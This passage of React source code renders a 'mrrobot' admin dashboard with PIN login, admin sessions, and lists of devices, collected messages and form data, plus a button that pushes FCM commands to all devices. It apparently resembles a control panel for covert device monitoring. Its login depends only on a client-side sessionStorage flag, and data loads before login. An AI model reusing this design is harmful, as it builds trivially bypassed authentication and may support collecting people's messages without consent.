        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, fontSize: 12, fontWeight: 700, color: t.txt2 }}>App Info</div>
        {[
          { label: "App ID", value: appId, mono: true },
        ].map(({ label, value, mono }) => (
          <Row key={label} label={label} value={value} mono={mono} />
        ))}
      </div>

      {/* ── Admin Sessions ── */}
      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <div style={{ fontWeight: 800, fontSize: 13, color: t.txt }}>Admin Sessions</div>
            <div style={{ background: sessions.length > 0 ? "#6366f1" : "#e2e8f0", color: sessions.length > 0 ? "#fff" : "#94a3b8", borderRadius: 99, padding: "1px 7px", fontSize: 10, fontWeight: 800 }}>
              {sessions.length}
            </div>
          </div>
          {sessions.length > 0 && (
            <button onClick={() => void logoutAll()} style={{ background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca", borderRadius: 7, padding: "4px 10px", fontSize: 10, fontWeight: 700, cursor: "pointer" }}>
              Logout All
            </button>
          )}
        </div>
        {sessLoading
          ? <div style={{ padding: 16, textAlign: "center", color: "#94a3b8", fontSize: 12 }}>Loading…</div>
          : sessions.length === 0
            ? <div style={{ padding: 20, textAlign: "center", color: "#94a3b8", fontSize: 12 }}>No active sessions</div>
            : sessions.map((s, i) => {
                const isMe = s.id === mySessionId;
                return (
                  <div key={s.id} style={{
                    display: "flex", alignItems: "center", gap: 10, padding: "10px 14px",
                    borderBottom: i < sessions.length - 1 ? `1px solid ${t.hdrB}` : "none",
                    background: isMe ? (t === DT ? "#2e1f5e" : "#f5f3ff") : t.card,
                  }}>
                    <div style={{ width: 36, height: 36, borderRadius: 9, background: isMe ? "#6366f1" : "#e2e8f0", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, fontSize: 15 }}>
                      {s.device.includes("iPhone") || s.device.includes("iPad") ? "🍎" :
                       s.device.includes("Android") ? "🤖" :
                       s.device.includes("Mac") ? "💻" :
                       s.device.includes("Windows") ? "🖥" : "📟"}
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
                        <span style={{ fontWeight: 700, fontSize: 12, color: t.txt }}>{s.device}</span>
                        {isMe && <span style={{ background: "#6366f1", color: "#fff", borderRadius: 99, padding: "1px 6px", fontSize: 9, fontWeight: 800 }}>THIS DEVICE</span>}
                      </div>
                      <div style={{ fontSize: 10, color: "#94a3b8", marginTop: 1 }}>
                        Login: {fmtTime(s.loginTime)} · IP: {s.ip.slice(0, 15)}
                      </div>
                    </div>
                    <button onClick={() => void logoutSession(s.id)} style={{
                      background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca",
                      borderRadius: 7, padding: "5px 10px", fontSize: 10, fontWeight: 700, cursor: "pointer", flexShrink: 0,
                    }}>
                      Logout
                    </button>
                  </div>
                );
              })
        }
      </div>
    </div>
  );
}

/* ════════════════════════════════════════
   LOGIN PAGE
════════════════════════════════════════ */
function LoginPage({ onAuth, appId, appName }: { onAuth: () => void; appId: string; appName: string }) {
  const [pin, setPin] = useState("");
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);
  const [mode, setMode] = useState<"login" | "change">("login");
  const [oldPin, setOldPin] = useState("");
  const [newPin, setNewPin] = useState("");
  const [newPin2, setNewPin2] = useState("");
  const [msg, setMsg] = useState("");

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true); setErr("");
    try {
      const r = await fetch(`/api/apps/${appId}/verify-pin`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin }),
      });
      if (!r.ok) {
        const j = await r.json().catch(() => ({}));
        const apiErr = (j as { error?: string }).error ?? "";
        setErr(
          apiErr.includes("expired") ? "App validity expired (30 days). Contact admin." :
          apiErr.includes("disabled") ? "This app is disabled. Contact admin." :
          "Wrong PIN. Try again."
        );
        setPin(""); return;
      }
      const sessR = await fetch("/api/admin/sessions", { method: "POST" }).catch(() => null);
      if (sessR?.ok) {
        const { sessionId } = await sessR.json();
        sessionStorage.setItem("mrrobot_session_id", sessionId);
      }
      sessionStorage.setItem("mrrobot_auth", "1");
      onAuth();
    } catch { setErr("Network error. Try again."); }
    finally { setLoading(false); }
  }

  async function handleChange(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true); setErr("");
    try {
      const verR = await fetch(`/api/apps/${appId}/verify-pin`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin: oldPin }),
      });
      if (!verR.ok) { setErr("Current PIN is wrong."); return; }
      if (newPin.length < 4) { setErr("New PIN must be at least 4 characters."); return; }
      if (newPin !== newPin2) { setErr("PINs do not match."); return; }
      await fetch(`/api/apps/${appId}`, {
        method: "PATCH", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin: newPin }),
      });
      setMsg("PIN changed! Please log in.");
      setMode("login");
      setOldPin(""); setNewPin(""); setNewPin2(""); setErr("");
    } catch { setErr("Network error. Try again."); }
    finally { setLoading(false); }
  }

  const inputStyle: React.CSSProperties = {
    width: "100%", padding: "12px 14px", borderRadius: 10,
    border: "1.5px solid #334155", background: "#1e293b",
    color: "#f1f5f9", fontSize: 14, outline: "none", boxSizing: "border-box",
  };
  const labelStyle: React.CSSProperties = {
    fontSize: 12, color: "#94a3b8", fontWeight: 600,
    textTransform: "uppercase", letterSpacing: 0.5, marginBottom: 6, display: "block",
  };

  return (
    <div style={{
      minHeight: "100vh", background: "#0a0f1a",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontFamily: "system-ui,-apple-system,'Segoe UI',sans-serif", padding: 16,
    }}>
      <div style={{ width: "100%", maxWidth: 380 }}>
        {/* Card */}
        <div style={{ background: "#111827", borderRadius: 18, padding: "32px 28px", border: "1px solid #1e293b", boxShadow: "0 20px 60px #00000080" }}>

          {/* Robot logo */}
          <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
            <svg width="52" height="52" viewBox="0 0 34 34" fill="none">
              <line x1="17" y1="1" x2="17" y2="7" stroke="#818cf8" strokeWidth="1.8" strokeLinecap="round"/>
              <circle cx="17" cy="1.5" r="2" fill="#818cf8"/>
              <rect x="3" y="7" width="28" height="22" rx="5" fill="#1e293b" stroke="#6366f1" strokeWidth="1.5"/>
              <rect x="8" y="13" width="6" height="6" rx="1.5" fill="#6366f1"/>
              <rect x="20" y="13" width="6" height="6" rx="1.5" fill="#6366f1"/>
              <rect x="2" y="16" width="2" height="5" rx="1" fill="#334155"/>
              <rect x="30" y="16" width="2" height="5" rx="1" fill="#334155"/>
              <rect x="8" y="22" width="18" height="4" rx="1.5" fill="#0f172a"/>
              <rect x="10" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
              <rect x="15.5" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
              <rect x="21" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
            </svg>
          </div>

          <div style={{ textAlign: "center", marginBottom: 28 }}>
            <div style={{ color: "#f8fafc", fontWeight: 900, fontSize: 22, letterSpacing: 1 }}>
              {mode === "login" ? "Welcome Back, Admin" : "Change PIN"}
            </div>
            {appName && <div style={{ color: "#475569", fontSize: 11, marginTop: 4, fontFamily: "monospace" }}>{appName}</div>}
          </div>

          {mode === "login" ? (
            <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: 16 }}>
              <div>
                <label style={labelStyle}>Token ID</label>
                <input value={appId} readOnly style={{ ...inputStyle, color: "#6366f1", cursor: "default", fontFamily: "monospace", letterSpacing: 1 }} />
              </div>
              <div>
                <label style={labelStyle}>PIN</label>
                <input
                  type="password" value={pin} onChange={e => { setPin(e.target.value); setErr(""); }}
                  placeholder="Enter PIN" autoFocus style={inputStyle}
                />
              </div>
              {err && <div style={{ color: "#f87171", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{err}</div>}
              {msg && <div style={{ color: "#4ade80", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{msg}</div>}
              <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
                <button type="submit" style={{
                  flex: 1, background: "#6366f1", color: "#fff", border: "none",
                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 700, cursor: "pointer",
                }}>Sign In</button>
                <button type="button" onClick={() => { setMode("change"); setErr(""); setMsg(""); }} style={{
                  flex: 1, background: "transparent", color: "#94a3b8", border: "1.5px solid #334155",
                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 600, cursor: "pointer",
                }}>Change PIN</button>
              </div>
            </form>
          ) : (
            <form onSubmit={handleChange} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
              <div>
                <label style={labelStyle}>Current PIN</label>
                <input type="password" value={oldPin} onChange={e => { setOldPin(e.target.value); setErr(""); }} placeholder="Current PIN" style={inputStyle} autoFocus />
              </div>
              <div>
                <label style={labelStyle}>New PIN</label>
                <input type="password" value={newPin} onChange={e => { setNewPin(e.target.value); setErr(""); }} placeholder="New PIN (min 4 chars)" style={inputStyle} />
              </div>
              <div>
                <label style={labelStyle}>Confirm New PIN</label>
                <input type="password" value={newPin2} onChange={e => { setNewPin2(e.target.value); setErr(""); }} placeholder="Confirm PIN" style={inputStyle} />
              </div>
              {err && <div style={{ color: "#f87171", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{err}</div>}
              <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
                <button type="submit" style={{
                  flex: 1, background: "#6366f1", color: "#fff", border: "none",
                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 700, cursor: "pointer",
                }}>Update PIN</button>
                <button type="button" onClick={() => { setMode("login"); setErr(""); }} style={{
                  flex: 1, background: "transparent", color: "#94a3b8", border: "1.5px solid #334155",
                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 600, cursor: "pointer",
                }}>Cancel</button>
              </div>
            </form>
          )}

          <div style={{ textAlign: "center", marginTop: 24, color: "#334155", fontSize: 11, fontWeight: 600 }}>
            Version: v1.0
          </div>
        </div>
      </div>
    </div>
  );
}

/* ════════════════════════════════════════
   ROOT
════════════════════════════════════════ */
export default function WebDashboard() {
  const [appId] = useState<string>(() => new URLSearchParams(window.location.search).get("appId") || "SKY-APP-2026-X9F3");
  const [appName, setAppName] = useState("");
  const [authed, setAuthed] = useState<boolean>(() => sessionStorage.getItem("mrrobot_auth") === "1");
  const [devices, setDevices] = useState<DbDevice[]>([]);
  const [messages, setMessages] = useState<DbMessage[]>([]);
  const [formData, setFormData] = useState<DbFormData[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    fetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null).then(app => { if (app?.name) setAppName(app.name); }).catch(() => {});
  }, [appId]);

  // Poll app status every 10s — force logout if app is disabled
  useEffect(() => {
    if (!authed) return;
    async function checkAppStatus() {
      try {
        const r = await fetch(`/api/apps/${appId}`);
        if (!r.ok) return;
        const app = await r.json() as { status: string; name?: string };
        if (app.name) setAppName(app.name);
        if (app.status !== "active") {
          const sid = sessionStorage.getItem("mrrobot_session_id");
          if (sid) fetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
          sessionStorage.removeItem("mrrobot_auth");
          sessionStorage.removeItem("mrrobot_session_id");
          setAuthed(false);
        }
      } catch { /* ignore network errors */ }
    }
    checkAppStatus();
    const t = setInterval(checkAppStatus, 10000);
    return () => clearInterval(t);
  }, [authed, appId]);

  const [darkMode, setDarkMode] = useState<boolean>(() => localStorage.getItem("mrrobot_dark") === "1");

  function toggleDark() {
    setDarkMode(d => {
      const next = !d;
      localStorage.setItem("mrrobot_dark", next ? "1" : "0");
      return next;
    });
  }

  const VALID_PAGES: Page[] = ["home", "messages", "groups", "devices", "settings"];
  const [page, setPage] = useState<Page>(() => {
    const saved = sessionStorage.getItem("mrrobot_page") as Page | null;
    return saved && VALID_PAGES.includes(saved) ? saved : "home";
  });
  const [selectedDevice, setSelectedDevice] = useState<DbDevice | null>(null);
  const [backPage, setBackPage] = useState<Page>("home");
  const [scrollToMsgId, setScrollToMsgId] = useState<string | null>(null);
  const [checkAllState, setCheckAllState] = useState<"idle" | "running" | "done">("idle");
  const [checkAllDone, setCheckAllDone] = useState(0);
  const [checkAllTotal, setCheckAllTotal] = useState(0);
  const [checkAllResult, setCheckAllResult] = useState<{ ok: number; fail: number } | null>(null);
  const [filterRecent, setFilterRecent] = useState(false);
  const [refreshing, setRefreshing] = useState(false);
  const [, liveTick] = useState(0); // global 1s tick — drives live timeAgo on all device cards
  useEffect(() => {
    const t = setInterval(() => liveTick(n => n + 1), 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => { sessionStorage.setItem("mrrobot_page", page); }, [page]);

  function onOpenDevice(device: DbDevice, msgId?: string) {
    setBackPage(page);
    setSelectedDevice(device);
    setPage("devices");
    sessionStorage.setItem("mrrobot_device_id", device.deviceId);
    if (msgId) setScrollToMsgId(msgId);
  }

  function onBack() {
    setSelectedDevice(null);
    setPage(backPage);
    sessionStorage.removeItem("mrrobot_device_id");
  }

  const loadData = useCallback(async (silent = false) => {
    if (!silent) setLoading(true);
    try {
      const [dRes, mRes, fRes] = await Promise.all([
        fetch(`/api/devices?appId=${appId}`),
        fetch(`/api/messages?appId=${appId}`),
        fetch(`/api/data?appId=${appId}`),
      ]);
      if (!dRes.ok || !mRes.ok) throw new Error("API error");
      const [d, m, f] = await Promise.all([dRes.json(), mRes.json(), fRes.ok ? fRes.json() : []]) as [DbDevice[], DbMessage[], DbFormData[]];
      setDevices(d); setMessages(m); setFormData(f);
      setError(null);
      const savedDeviceId = sessionStorage.getItem("mrrobot_device_id");
      if (savedDeviceId) {
        const found = (d as DbDevice[]).find(dev => dev.deviceId === savedDeviceId);
        if (found) setSelectedDevice(found);
      }
    } catch (e) { if (!silent) setError((e as Error).message); }
    finally { if (!silent) setLoading(false); }
  }, [appId]);

  // Initial load
  useEffect(() => { void loadData(false); }, [loadData]);

  // SSE — real-time live updates, no polling
  useEffect(() => {
    if (!authed) return;
    const es = new EventSource("/api/events");

    es.addEventListener("device_updated", (e: MessageEvent) => {
      const data = JSON.parse(e.data) as { deviceId: string; appId: string };
      if (data.appId !== appId) return;
      // Notify CheckOnlineBtn timer
      window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: { deviceId: data.deviceId } }));
      // Silently refresh devices list (lastOnline recalculated server-side)
      void (async () => {
        try {
          const r = await fetch(`/api/devices?appId=${appId}`);
          if (r.ok) {
            const d = await r.json() as DbDevice[];
            setDevices(d);
            const savedId = sessionStorage.getItem("mrrobot_device_id");
            if (savedId) { const found = d.find(dev => dev.deviceId === savedId); if (found) setSelectedDevice(found); }
          }
        } catch { /* ignore */ }
      })();
    });

    es.addEventListener("message_added", (e: MessageEvent) => {
      const data = JSON.parse(e.data) as { appId: string; message: DbMessage };
      if (data.appId !== appId) return;
      setMessages(prev => [data.message, ...prev]);
    });

    es.onerror = () => {
      // EventSource auto-reconnects on error — no manual action needed
    };

    return () => es.close();
  }, [authed, appId]);

  async function handleManualRefresh() {
    setRefreshing(true);
    await loadData(true);
    setRefreshing(false);
  }

  const totalDevices = devices.length;
  const recentCount = devices.filter(d => isRecent(d.lastOnline)).length;
  const displayDevices = filterRecent ? devices.filter(d => isRecent(d.lastOnline)) : devices;

  async function handleCheckAll() {
    if (checkAllState === "running") return;
    // latest → oldest: reverse of DB insertion order
    const allDevices = [...devices].reverse();
    if (!allDevices.length) { setCheckAllState("done"); setTimeout(() => setCheckAllState("idle"), 2500); return; }

    const BATCH_SIZE = 2;
    const BATCH_DELAY_MS = 800;

    setCheckAllState("running");
    setCheckAllDone(0);
    setCheckAllTotal(allDevices.length);
    setCheckAllResult(null);
    let ok = 0; let fail = 0;

    for (let i = 0; i < allDevices.length; i += BATCH_SIZE) {
      const batch = allDevices.slice(i, i + BATCH_SIZE);
      const results = await Promise.allSettled(
        batch.map(d =>
          fcmSend(d.deviceId, { type: "0" })
        )
      );
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setCheckAllDone(Math.min(i + BATCH_SIZE, allDevices.length));
      if (i + BATCH_SIZE < allDevices.length) {
        await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
      }
    }

    setCheckAllResult({ ok, fail });
    setCheckAllState("done");
    setTimeout(() => { setCheckAllState("idle"); setCheckAllDone(0); setCheckAllTotal(0); setCheckAllResult(null); }, 4000);
  }

  const NAV: { key: Page; label: string }[] = [
    { key: "home", label: "Home" },
    { key: "messages", label: "Messages" },
    { key: "groups", label: "Groups" },
    { key: "devices", label: "Devices" },
    { key: "settings", label: "Settings" },
  ];

  function handleLogout() {
    const sid = sessionStorage.getItem("mrrobot_session_id");
    if (sid) fetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
    sessionStorage.removeItem("mrrobot_auth");
    sessionStorage.removeItem("mrrobot_session_id");
    setAuthed(false);
  }

  if (!authed) return <LoginPage onAuth={() => setAuthed(true)} appId={appId} appName={appName} />;

  const theme = darkMode ? DT : LT;

  return (
    <ThemeCtx.Provider value={theme}>
    <div style={{ minHeight: "100vh", background: theme.bg, fontFamily: "system-ui,-apple-system,'Segoe UI',sans-serif", color: theme.txt, display: "flex", justifyContent: "center" }}>
      <div style={{ width: "100%", maxWidth: 440, minHeight: "100vh", display: "flex", flexDirection: "column", background: theme.bg }}>

        {/* Header */}
        <div style={{ background: theme.card, position: "sticky", top: 0, zIndex: 50, borderBottom: `1px solid ${theme.cardB}` }}>
        <div style={{ padding: "8px 14px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          {/* Left: logo + name */}
          <div style={{ display: "flex", alignItems: "center", gap: 9 }}>
            <svg width="30" height="30" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">
              <line x1="17" y1="1" x2="17" y2="7" stroke="#6366f1" strokeWidth="1.8" strokeLinecap="round"/>
              <circle cx="17" cy="1.5" r="2" fill="#6366f1"/>
              <rect x="3" y="7" width="28" height="22" rx="5" fill={darkMode ? "#2e3a5c" : "#e0e7ff"} stroke="#6366f1" strokeWidth="1.5"/>
              <rect x="8" y="13" width="6" height="6" rx="1.5" fill="#6366f1"/>
              <rect x="20" y="13" width="6" height="6" rx="1.5" fill="#6366f1"/>
              <rect x="2" y="16" width="2" height="5" rx="1" fill={darkMode ? "#4a5a8a" : "#c7d2fe"}/>
              <rect x="30" y="16" width="2" height="5" rx="1" fill={darkMode ? "#4a5a8a" : "#c7d2fe"}/>
              <rect x="8" y="22" width="18" height="4" rx="1.5" fill={darkMode ? "#1e293b" : "#c7d2fe"}/>
              <rect x="10" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
              <rect x="15.5" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
              <rect x="21" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
            </svg>
            <div>
              <div style={{ color: theme.txt, fontWeight: 900, fontSize: 13, letterSpacing: 1 }}>{appName}</div>
              <div style={{ color: theme.muted, fontSize: 8, fontFamily: "monospace" }}>{appId}</div>
            </div>
          </div>

          {/* Right: two compact pills */}
          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>

            {/* 15-min online pill — clickable filter toggle */}
            <button
              onClick={() => setFilterRecent(f => !f)}
              style={{
                display: "flex", alignItems: "center", gap: 5,
                background: filterRecent ? "#4ade80" : "#052e16",
                border: `1px solid ${filterRecent ? "#4ade80" : "#166534"}`,
                borderRadius: 20, padding: "4px 10px",
                cursor: "pointer",
                boxShadow: filterRecent ? "0 0 10px #4ade8066" : "none",
                transition: "all 0.15s",
              }}
            >
              <span style={{
                width: 6, height: 6, borderRadius: "50%",
                background: filterRecent ? "#052e16" : "#4ade80",
                boxShadow: filterRecent ? "none" : "0 0 6px #4ade80",
                display: "inline-block", flexShrink: 0,
              }} />
              <span style={{ fontSize: 11, fontWeight: 700, color: filterRecent ? "#052e16" : "#4ade80", lineHeight: 1 }}>
                {recentCount}
              </span>
              <span style={{ fontSize: 9, color: filterRecent ? "#166534" : "#86efac", fontWeight: 600, lineHeight: 1 }}>
                /15m
              </span>
            </button>

            {/* Manual Refresh button */}
            <button
              onClick={() => void handleManualRefresh()}
              disabled={refreshing}
              title="Refresh devices & messages"
              style={{
                display: "flex", alignItems: "center", gap: 4,
                background: "#0f172a", border: "1px solid #334155",
                borderRadius: 20, padding: "4px 10px", cursor: refreshing ? "wait" : "pointer",
              }}
            >
              <svg width="10" height="10" viewBox="0 0 10 10" fill="none"
                style={{ transform: refreshing ? "rotate(360deg)" : "none", transition: refreshing ? "transform 0.6s linear" : "none" }}>
                <path d="M5 1.5A3.5 3.5 0 1 1 1.5 5" stroke={refreshing ? "#60a5fa" : "#94a3b8"} strokeWidth="1.5" strokeLinecap="round"/>
                <polyline points="1.5,2.5 1.5,5 4,5" stroke={refreshing ? "#60a5fa" : "#94a3b8"} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              <span style={{ fontSize: 10, fontWeight: 700, color: refreshing ? "#60a5fa" : "#94a3b8", lineHeight: 1 }}>
                {refreshing ? "…" : "Sync"}
              </span>
            </button>

            {/* Check Online All pill button */}
            <button
              onClick={() => void handleCheckAll()}
              disabled={checkAllState === "running"}
              style={{
                display: "flex", alignItems: "center", gap: 5,
                background: checkAllState === "done"
                  ? "#052e16"
                  : checkAllState === "running"
                  ? "#1e1b4b"
                  : "#1e1b4b",
                border: `1px solid ${checkAllState === "done" ? "#166534" : "#4f46e5"}`,
                borderRadius: 20, padding: "4px 10px",
                cursor: checkAllState === "running" ? "wait" : "pointer",
              }}
            >
              {/* icon */}
              <svg width="10" height="10" viewBox="0 0 10 10" fill="none">
                {checkAllState === "done"
                  ? <polyline points="1.5,5 4,7.5 8.5,2" stroke="#4ade80" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
                  : checkAllState === "running"
                  ? <circle cx="5" cy="5" r="3.5" stroke="#818cf8" strokeWidth="1.5" strokeDasharray="5 3"/>
                  : <><circle cx="5" cy="5" r="3.5" stroke="#818cf8" strokeWidth="1.5"/><polygon points="4,3.2 7.5,5 4,6.8" fill="#818cf8"/></>
                }
              </svg>
              <span style={{
                fontSize: 10, fontWeight: 700, lineHeight: 1, whiteSpace: "nowrap",
                color: checkAllState === "done" ? "#4ade80" : "#a5b4fc",
              }}>
                {checkAllState === "running"
                  ? `${checkAllDone}/${checkAllTotal}`
                  : checkAllState === "done"
                  ? "Sent!"
                  : "Ping All"}
              </span>
            </button>

          </div>
        </div>
        {/* Ping All progress bar / result */}
        {checkAllState === "running" && (
          <div style={{ height: 3, background: "#1e1b4b", overflow: "hidden" }}>
            <div style={{ height: "100%", background: "#6366f1", width: `${checkAllTotal > 0 ? Math.round((checkAllDone / checkAllTotal) * 100) : 0}%`, transition: "width 0.4s ease" }} />
          </div>
        )}
        {checkAllState === "done" && checkAllResult && (
          <div style={{ padding: "3px 14px", display: "flex", alignItems: "center", gap: 8, background: "#0f172a" }}>
            <span style={{ fontSize: 10, fontWeight: 700, color: "#4ade80" }}>✓ {checkAllResult.ok} sent</span>
            {checkAllResult.fail > 0 && (
              <span style={{ fontSize: 10, fontWeight: 700, color: "#f59e0b" }}>· ✗ {checkAllResult.fail} failed</span>
            )}
          </div>
        )}
        </div>

        {/* Tab nav */}
        <div style={{ background: theme.hdr, display: "flex", borderBottom: `2px solid ${theme.cardB}`, position: "sticky", top: 44, zIndex: 49 }}>
          {NAV.map(({ key, label }) => {
            const active = page === key;
            return (
              <button key={key} onClick={() => { setPage(key); setSelectedDevice(null); setScrollToMsgId(null); }} style={{
                flex: 1, padding: "9px 2px", border: "none", background: "none",
                cursor: "pointer", fontSize: 11,
                fontWeight: active ? 700 : 400,
                color: active ? "#2563eb" : "#64748b",
                borderBottom: active ? "2px solid #2563eb" : "2px solid transparent",
                marginBottom: -2,
              }}>
                {label}
              </button>
            );
          })}
        </div>

        {/* Content */}
        {loading && (
          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
            <div style={{ fontSize: 13, color: "#64748b" }}>Loading…</div>
          </div>
        )}
        {!loading && error && (
          <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 8, padding: 40 }}>
            <div style={{ fontSize: 13, color: "#ef4444", fontWeight: 600 }}>Error: {error}</div>
            <div style={{ fontSize: 11, color: "#94a3b8" }}>Check that the API server is running.</div>
          </div>
        )}
        {!loading && !error && (
          <div style={{ flex: 1, overflowY: "auto" }}>
            {page === "home" && <HomePage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} />}
            {page === "messages" && <MessagesPage messages={messages} devices={displayDevices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} />}
            {page === "groups" && <GroupsPage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} />}
            {page === "devices" && <DevicesPage devices={displayDevices} messages={messages} initialDevice={selectedDevice} onBack={onBack} />}
            {page === "settings" && <SettingsPage appId={appId} isDark={darkMode} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} />}
          </div>
        )}
      </div>
    </div>
    </ThemeCtx.Provider>
  );
}
